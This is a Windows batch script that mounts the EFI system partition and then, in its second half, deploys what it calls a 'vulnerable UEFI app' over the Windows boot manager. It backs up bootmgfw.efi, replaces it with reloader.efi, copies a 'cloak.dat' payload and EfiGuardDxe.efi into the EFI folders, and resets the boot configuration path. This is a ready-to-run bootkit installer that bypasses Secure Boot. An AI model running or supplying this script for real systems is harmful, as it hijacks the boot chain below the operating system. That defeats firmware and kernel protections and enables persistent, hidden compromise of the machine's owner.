@echo off

@echo off
:: Check for administrator privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrator privileges.
    echo Please run as administrator.
    pause
    exit /b 1
)

echo Mounting EFI partition...
echo.

:: Create a temporary diskpart script
set "diskpart_script=%temp%\mount_efi.txt"

:: List volumes and find EFI
echo list volume > "%diskpart_script%"
echo exit >> "%diskpart_script%"

diskpart /s "%diskpart_script%" > "%temp%\volume_list.txt"

:: Show volume list to user
echo Current volumes:
echo ================
type "%temp%\volume_list.txt" | findstr /i "Volume FAT32"
echo.

:: Parse to find EFI volume with FAT32
setlocal enabledelayedexpansion
set "efi_volume="

for /f "tokens=1-8" %%a in ('type "%temp%\volume_list.txt" ^| findstr /i "EFI"') do (
    :: Check if it's FAT32
    echo %%a %%b %%c %%d %%e %%f %%g %%h | findstr /i "FAT32" >nul
    if !errorlevel! equ 0 (
        set "efi_volume=%%b"
        echo Found EFI partition: Volume %%b
    )
)

if "%efi_volume%"=="" (
    echo ERROR: No EFI partition with FAT32 format found!
    goto :cleanup
)

:: Mount the EFI partition as S:
echo select volume %efi_volume% > "%diskpart_script%"
echo assign letter=S >> "%diskpart_script%"
echo exit >> "%diskpart_script%"

diskpart /s "%diskpart_script%"

if %errorlevel% equ 0 (
    echo.
    echo SUCCESS: EFI partition mounted as drive S:
    explorer S:\
) else (
    echo ERROR: Failed to mount EFI partition!
)

:cleanup
:: Clean up temporary files
if exist "%diskpart_script%" del "%diskpart_script%"
if exist "%temp%\volume_list.txt" del "%temp%\volume_list.txt"

:: pause


mountvol S: /S >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Mounting ESP to S:…
    mountvol S: /S
) ELSE (
    echo ESP already mounted as S:
)

SET "ESP=S:"
SET "VULN_APP=%USERPROFILE%\Desktop\poc\reloader.efi"
SET "PAYLOAD=%USERPROFILE%\Desktop\poc\cloak.dat"

IF NOT EXIST "%ESP%\EFI\Microsoft\Boot\bootmgfw-orig.efi" (
    echo Backing up bootmgfw.efi…
    copy "%ESP%\EFI\Microsoft\Boot\bootmgfw.efi" "%ESP%\EFI\Microsoft\Boot\bootmgfw-orig.efi" >nul
) ELSE (
    echo Backup already exists: bootmgfw-orig.efi
)

echo Deploying vulnerable UEFI app…
copy "%VULN_APP%" "%ESP%\EFI\Microsoft\Boot\bootmgfw.efi" /Y >nul

echo Copying payload to \\EFI\boot\cloak.dat…
mkdir "%ESP%\EFI\boot" 2>nul
copy "%PAYLOAD%" "%ESP%\EFI\boot\cloak.dat" /Y >nul

copy "%USERPROFILE%\Desktop\poc\EfiGuardDxe.efi" "%ESP%\EFI\Boot\EfiGuardDxe.efi" /Y >nul


echo Copying payload to EFI\Microsoft\Boot\cloak.dat…
copy "%PAYLOAD%" "%ESP%\EFI\Microsoft\Boot\cloak.dat" /Y >nul

echo Updating BCD to launch reloader.efi…
bcdedit /set {bootmgr} path \EFI\Microsoft\Boot\bootmgfw.efi >nul

echo.
echo *** Deployment complete! ***
:: pause
